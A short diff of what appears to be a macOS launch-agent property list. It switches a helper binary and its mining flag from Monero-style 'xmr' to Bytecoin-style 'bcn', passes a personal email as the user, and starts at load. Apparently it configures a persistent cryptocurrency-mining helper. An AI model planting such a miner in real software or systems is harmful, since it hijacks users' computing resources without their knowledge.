@@ -11,10 +11,10 @@
 	<key>ProgramArguments</key>
 	<array>
 		<string>/usr/bin/env</string>
-		<string>/bin/./xmr-helper</string>
+		<string>/bin/./bcn-helper</string>
 		<string>-user</string>
 		<string>randy.lee.mcmillan@gmail.com</string>
-		<string>--xmr</string>
+		<string>--bcn</string>
 		<string>2</string>
 	</array>
 	<key>RunAtLoad</key>
